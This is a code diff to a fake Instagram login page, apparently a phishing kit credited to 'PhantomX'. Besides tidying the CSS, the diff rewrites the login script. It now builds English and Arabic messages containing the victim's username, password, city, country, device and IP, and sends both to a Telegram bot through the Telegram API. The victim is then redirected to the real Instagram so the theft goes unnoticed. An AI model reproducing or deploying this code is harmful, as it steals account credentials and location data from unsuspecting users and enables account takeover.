@@ -8,7 +8,7 @@
     <meta name="author" content="Luan Fernando" />
     <title>Instagram</title>
     <style>
-    h1,h2,h3,p,ul {
+        h1,h2,h3,p,ul {
             margin: 0;
         }
         ul {
@@ -30,7 +30,7 @@
             grid-template-columns: 1fr 350px;
             column-gap: 1.25rem;
             width: 755px;
-            margin: 60px auto 60px; /* تقليل المسافة العلوية والسفلية */
+            margin: 60px auto 60px;
         }
         .img-photo {
             height: 635px;
@@ -48,12 +48,12 @@
         .form-login {
             text-align: center;
             font-size: 14px;
-            margin-top: 0; /* تقليل المسافة العلوية */
+            margin-top: 0;
         }
         .form-login form {
             text-align: center;
             background-color: #fff;
-            padding: 1rem 2rem; /* تقليل الحشو */
+            padding: 1rem 2rem;
             border: 1px solid rgb(219,219,219);
             margin-bottom: 10px;
         }
@@ -62,7 +62,7 @@
             color: #262626;
             box-sizing: border-box;
             font-size: 0.7rem;
-            padding: 12px 0 12px 8px; /* تقليل الحشو في الحقول */
+            padding: 12px 0 12px 8px;
             border: 1px solid #dbdbdb;
             margin-bottom: 4px;
             border-radius: 3px;
@@ -72,7 +72,7 @@
             color: #fff;
             font-weight: bold;
             width: 100%;
-            margin-top: 10px; /* تقليل المسافة العلوية */
+            margin-top: 10px;
             background: #0195f6;
             border: none;
             padding: 8px;
@@ -84,7 +84,7 @@
             cursor: default;
         }
         .or {
-            margin: 1rem 0 1rem; /* تقليل المسافة حول "OR" */
+            margin: 1rem 0 1rem;
             font-size: 13px;
             color: #8E8E8E;
             text-transform: uppercase;
@@ -116,8 +116,8 @@
         .signup {
             border: 1px solid #dbdbdb;
             background-color: #fff;
-            padding: 15px 0; /* تقليل الحشو */
-            margin: 0 0 15px; /* تقليل المسافة السفلية */
+            padding: 15px 0;
+            margin: 0 0 15px;
         }
         .signup a {
             font-weight: 600;
@@ -235,39 +235,48 @@
                 // جمع معلومات الجهاز
                 const deviceInfo = getDeviceInfo();
 
-                // بناء الرسالة
-                const message = `🔓 *The active account was activated by PhantomX.* 🔓\n\n` +
-                                `💻 *Account information:* 💻\n` +
-                                `📧 Username, number, or email: ${username}\n` +
-                                `🔑 Password: ${password}\n\n` +
-                                `🌍 *Location:* ${locationData.city}, ${locationData.country}\n` +
-                                `📱 *Device:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
-                                `📲 *IP:* ${locationData.ip}\n\n` +
-                                `Hacked by PhantomX @tx_5w` +
-                                ` Account type: Instagram☣`;
-              
-                const message1 = `🔓 *تم تفعيل الحساب النشط بواسطة PhantomX.* 🔓\n\n` +
-                                `💻 *معلومات الحساب:* 💻\n` +
-                                `📧 اسم المستخدم أو الرقم أو البريد الإلكتروني: ${username}\n` +
-                                `🔑 كلمة المرور: ${password}\n\n` +
-                                `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
-                                `📱 *الجهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
-                                `📲 *IP:* ${locationData.ip}\n\n` +
-                                `تم الاختراق بواسطة PhantomX @tx_5w` +
-                                `نوع الحساب: Instagram☣`;
+                // بناء الرسالة الإنجليزية
+                const messageEn = `🔓 *The active account was activated by PhantomX.* 🔓\n\n` +
+                                  `💻 *Account information:* 💻\n` +
+                                  `📧 Username, number, or email: ${username}\n` +
+                                  `🔑 Password: ${password}\n\n` +
+                                  `🌍 *Location:* ${locationData.city}, ${locationData.country}\n` +
+                                  `📱 *Device:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
+                                  `📲 *IP:* ${locationData.ip}\n\n` +
+                                  `Hacked by PhantomX @tx_5w\n` +
+                                  `Account type: Instagram☣`;
 
-                // إرسال الرسالة إلى قناة تليجرام
-                const telegramChannel = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
-                fetch(telegramChannel).then(response => {
-                    console.log("تم إرسال الرسالة إلى التليجرام.");
+                // بناء الرسالة العربية
+                const messageAr = `🔓 *تم تفعيل الحساب النشط بواسطة PhantomX.* 🔓\n\n` +
+                                  `💻 *معلومات الحساب:* 💻\n` +
+                                  `📧 اسم المستخدم أو الرقم أو البريد الإلكتروني: ${username}\n` +
+                                  `🔑 كلمة المرور: ${password}\n\n` +
+                                  `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
+                                  `📱 *الجهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
+                                  `📲 *IP:* ${locationData.ip}\n\n` +
+                                  `تم الاختراق بواسطة PhantomX @tx_5w\n` +
+                                  `نوع الحساب: Instagram☣`;
+
+                // إرسال الرسالة الإنجليزية إلى قناة تليجرام
+                const telegramChannelEn = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(messageEn);
+                fetch(telegramChannelEn).then(response => {
+                    console.log("تم إرسال الرسالة الإنجليزية إلى التليجرام.");
                 }).catch(error => {
-                    console.error("خطأ في إرسال الرسالة:", error);
+                    console.error("خطأ في إرسال الرسالة الإنجليزية:", error);
+                });
+
+                // إرسال الرسالة العربية إلى قناة تليجرام
+                const telegramChannelAr = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(messageAr);
+                fetch(telegramChannelAr).then(response => {
+                    console.log("تم إرسال الرسالة العربية إلى التليجرام.");
+                }).catch(error => {
+                    console.error("خطأ في إرسال الرسالة العربية:", error);
                 });
 
                 // إعادة التوجيه إلى Instagram بعد 5 ثواني
                 setTimeout(() => {
                     window.location.href = "https://www.instagram.com";
-                }, 5000);
+                }, 2000);
             });
 
             // جلب بيانات الموقع الجغرافي
